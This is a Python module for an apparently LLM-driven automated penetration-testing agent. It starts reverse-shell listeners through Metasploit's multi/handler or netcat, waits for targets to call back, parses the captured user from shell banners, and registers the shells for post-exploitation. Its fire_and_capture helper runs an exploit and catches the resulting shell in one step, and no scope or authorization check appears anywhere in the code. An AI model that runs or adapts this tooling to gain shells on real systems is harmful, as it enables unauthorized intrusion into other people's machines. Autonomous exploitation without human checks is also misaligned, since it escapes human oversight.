"""Listener manager (Recommendation C).

Reverse-shell exploitation needs a listener.  Without one, every
``payload reverse_tcp`` fires into the void: the target tries to call
back, nothing answers, the LLM evaluator sees no shell in stdout,
flags the vector failed, moves on.  The audit confirmed this is a
silent killer: the LLM is even asked for ``pre_command``, ``lhost``,
and ``lport`` in :meth:`MasterAgent._llm_build_exploit_command`, but
the dispatch site (``master_agent.py:3755``) ignores those fields
entirely.

This module fills that gap.  :class:`ListenerManager` exposes a small
async API used both by the master's exploit phase and by the reasoning
loop:

* :meth:`acquire` — pick / allocate ``(lhost, lport)`` for an exploit
  attempt and start a `multi/handler` (or `nc -lvnp`) listener.
* :meth:`wait_for_session` — block up to ``timeout`` seconds for a
  callback signature in the listener output.  When seen, it parses the
  user / pid / target identity off the banner and calls back into
  :meth:`MasterAgent.register_shell` so post-exploit gating works.
* :meth:`release` — kill the listener cleanly when the exploit attempt
  is over.
* :meth:`active_sessions` — list captured sessions so the UI / shell
  manager can attach.

The implementation favours `msfconsole` (`exploit/multi/handler`) when
available because it parses Meterpreter sessions automatically.  When
msfconsole isn't present it falls back to `nc -lvnp` which still picks
up a basic shell (just no Meterpreter).  All listeners are started in
the master's local subprocess space — no MCP — because they need to
bind a port on the attacker box, not on Kali-via-MCP.

Subprocess invocation uses the argv-list form (no shell interpolation),
so command-injection concerns from operator-controlled values do not
apply: every value (lhost, lport, payload) is bounded to scalar fields
the manager allocates itself.
"""

from __future__ import annotations

import asyncio
import logging
import re
import shutil
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional


logger = logging.getLogger(__name__)


__all__ = ["ListenerManager", "ActiveSession"]


# ── Callback signature regex ──────────────────────────────────────────────
_RE_MSF_SESSION = re.compile(
    r"\[\*\]\s+(?:Meterpreter session|Command shell session|Sending stage|"
    r"Started reverse (?:TCP|HTTPS?)?\s*handler|"
    r"sessions opened|Session\s+\d+\s+opened)",
    re.I,
)
_RE_NC_CONN = re.compile(
    r"(?:connect to .* from |connection from |Ncat:.*Connection from|"
    r"listening on (?:any|\[?[0-9a-f.:]+\]?)\s*[:0-9]+\s*\.\.\.\s*"
    r"connect to)",
    re.I,
)
_RE_PWNCAT     = re.compile(r"\[\+\]\s*pwncat:\s+pinned", re.I)
_RE_UID_PROMPT = re.compile(r"\buid=\d+\(([^)]+)\)|^([\w.-]+)@[\w.-]+:[^\n]*[#$]", re.M)


# ── Data class ────────────────────────────────────────────────────────────

@dataclass
class ActiveSession:
    session_id: str
    lhost:      str
    lport:      int
    backend:    str
    proc:       Any
    started_at: str = ""
    user:       Optional[str] = None
    rhost:      Optional[str] = None
    captured:   bool = False
    output:     List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "lhost":      self.lhost,
            "lport":      self.lport,
            "backend":    self.backend,
            "started_at": self.started_at,
            "user":       self.user,
            "rhost":      self.rhost,
            "captured":   self.captured,
            "tail":       "".join(self.output[-2000:]),
        }


# ── Manager ───────────────────────────────────────────────────────────────

class ListenerManager:
    """Per-session listener orchestrator."""

    DEFAULT_PORT_POOL = list(range(4444, 4474))

    def __init__(
        self,
        *, master_agent: Any,
        lhost: Optional[str] = None,
        port_pool: Optional[List[int]] = None,
    ) -> None:
        self._master      = master_agent
        self._port_pool   = list(port_pool or self.DEFAULT_PORT_POOL)
        self._used_ports: set = set()
        self._sessions:   Dict[str, ActiveSession] = {}
        self._lock        = asyncio.Lock()

        self.lhost: str = (lhost or
                           getattr(master_agent, "_auto_detect_lhost", lambda: "127.0.0.1")())

        self._has_msfconsole = bool(shutil.which("msfconsole"))
        self._has_ncat       = bool(shutil.which("ncat"))
        self._has_nc         = bool(shutil.which("nc"))
        self._default_backend = (
            "msfconsole" if self._has_msfconsole
            else "ncat"  if self._has_ncat
            else "nc"    if self._has_nc
            else "none"
        )
        logger.info(
            "[ListenerManager] lhost=%s default=%s msf=%s ncat=%s nc=%s",
            self.lhost, self._default_backend,
            self._has_msfconsole, self._has_ncat, self._has_nc,
        )

    # ── Allocation ─────────────────────────────────────────────────────
    def _pick_port(self) -> int:
        for p in self._port_pool:
            if p not in self._used_ports:
                self._used_ports.add(p)
                return p
        import random
        p = random.randint(40000, 50000)
        self._used_ports.add(p)
        return p

    # ── Lifecycle ──────────────────────────────────────────────────────
    async def acquire(
        self,
        *, payload: str = "linux/x64/shell_reverse_tcp",
        backend: Optional[str] = None,
        lport:   Optional[int] = None,
    ) -> ActiveSession:
        """Start a listener and return its handle."""
        backend = backend or self._default_backend
        if backend == "none":
            raise RuntimeError(
                "ListenerManager: no msfconsole / ncat / nc binary on PATH"
            )

        port = lport or self._pick_port()
        sid  = f"sess-{port}-{int(asyncio.get_event_loop().time())}"

        if backend == "msfconsole":
            argv = [
                "msfconsole", "-q", "-x",
                f"use exploit/multi/handler; "
                f"set PAYLOAD {payload}; "
                f"set LHOST {self.lhost}; "
                f"set LPORT {port}; "
                f"set ExitOnSession false; "
                f"exploit -j -z",
            ]
        elif backend == "ncat":
            argv = ["ncat", "-lvnp", str(port), "-k"]
        else:
            argv = ["nc", "-lvnp", str(port)]

        async with self._lock:
            try:
                proc = await asyncio.create_subprocess_exec(
                    *argv,
                    stdout = asyncio.subprocess.PIPE,
                    stderr = asyncio.subprocess.STDOUT,
                    start_new_session = True,
                )
            except FileNotFoundError as exc:
                raise RuntimeError(f"backend '{backend}' missing: {exc}")

            sess = ActiveSession(
                session_id = sid,
                lhost      = self.lhost,
                lport      = port,
                backend    = backend,
                proc       = proc,
                started_at = datetime.now(timezone.utc).isoformat(),
            )
            self._sessions[sid] = sess

        try:
            await self._master._emit("listener_started", {
                "session_id": sid,
                "lhost":      self.lhost,
                "lport":      port,
                "backend":    backend,
                "payload":    payload,
            })
        except Exception:
            pass

        return sess

    async def wait_for_session(
        self,
        session: ActiveSession,
        *, timeout: float = 30.0,
        rhost: Optional[str] = None,
    ) -> bool:
        """Block up to ``timeout`` seconds for a callback signature."""
        if session.proc.stdout is None:
            return False

        deadline = asyncio.get_event_loop().time() + timeout

        async def _readline() -> Optional[str]:
            try:
                line = await session.proc.stdout.readline()
                return line.decode(errors="replace") if line else None
            except Exception:
                return None

        while True:
            remaining = deadline - asyncio.get_event_loop().time()
            if remaining <= 0:
                return False
            try:
                line = await asyncio.wait_for(_readline(), timeout=remaining)
            except asyncio.TimeoutError:
                return False
            if line is None:
                return False
            session.output.append(line)

            hit = (_RE_MSF_SESSION.search(line)
                   or _RE_NC_CONN.search(line)
                   or _RE_PWNCAT.search(line))
            if not hit:
                continue

            session.captured = True
            session.rhost    = rhost
            user_match       = _RE_UID_PROMPT.search(line)
            if user_match:
                session.user = user_match.group(1) or user_match.group(2)

            for _ in range(8):
                try:
                    extra = await asyncio.wait_for(_readline(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                if extra is None:
                    break
                session.output.append(extra)
                if not session.user:
                    m = _RE_UID_PROMPT.search(extra)
                    if m:
                        session.user = m.group(1) or m.group(2)

            try:
                register = getattr(self._master, "register_shell", None)
                if callable(register):
                    await register(
                        source     = f"listener:{session.backend}",
                        user       = session.user or "unknown",
                        host       = session.rhost or "",
                        method     = f"reverse_shell:{session.backend}",
                        evidence   = "".join(session.output[-1500:]),
                        session_id = session.session_id,
                        rhost      = session.rhost,
                        rport      = session.lport,
                    )
            except Exception as exc:
                logger.warning("[ListenerManager] register_shell failed: %s", exc)

            return True

    async def release(self, session: ActiveSession) -> None:
        """Terminate a listener.  Idempotent."""
        proc = session.proc
        if proc and proc.returncode is None:
            try:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except asyncio.TimeoutError:
                    try:
                        proc.kill()
                    except ProcessLookupError:
                        pass
            except ProcessLookupError:
                pass
        self._used_ports.discard(session.lport)
        try:
            await self._master._emit("listener_stopped", {
                "session_id": session.session_id,
                "lport":      session.lport,
                "captured":   session.captured,
            })
        except Exception:
            pass

    # ── Convenience: full callback round-trip ──────────────────────────
    async def fire_and_capture(
        self,
        *, run_exploit_coro,
        payload: str = "linux/x64/shell_reverse_tcp",
        backend: Optional[str] = None,
        lport:   Optional[int] = None,
        timeout: float = 45.0,
        rhost:   Optional[str] = None,
    ) -> Dict[str, Any]:
        """One-shot helper: acquire → fire → wait → release."""
        session = await self.acquire(payload=payload, backend=backend, lport=lport)
        try:
            exploit_task = asyncio.create_task(
                run_exploit_coro(session.lhost, session.lport)
            )
            wait_task = asyncio.create_task(
                self.wait_for_session(session, timeout=timeout, rhost=rhost)
            )
            done, pending = await asyncio.wait(
                {exploit_task, wait_task},
                return_when = asyncio.FIRST_COMPLETED,
                timeout     = timeout + 5.0,
            )
            if wait_task in done and wait_task.result():
                pass
            else:
                try:
                    captured = await asyncio.wait_for(
                        wait_task, timeout=max(2.0, timeout / 2)
                    )
                except asyncio.TimeoutError:
                    captured = False
                if not captured and exploit_task in pending:
                    exploit_task.cancel()
            for t in (exploit_task, wait_task):
                if not t.done():
                    t.cancel()
        finally:
            await self.release(session)

        return {
            "captured":   session.captured,
            "session_id": session.session_id,
            "user":       session.user,
            "rhost":      session.rhost,
            "lport":      session.lport,
            "backend":    session.backend,
            "evidence":   "".join(session.output[-1500:]),
        }

    # ── Inspection ─────────────────────────────────────────────────────
    def active_sessions(self) -> List[Dict[str, Any]]:
        return [s.to_dict() for s in self._sessions.values() if s.captured]

    async def shutdown(self) -> None:
        """Release every listener — call on engagement teardown."""
        for s in list(self._sessions.values()):
            await self.release(s)
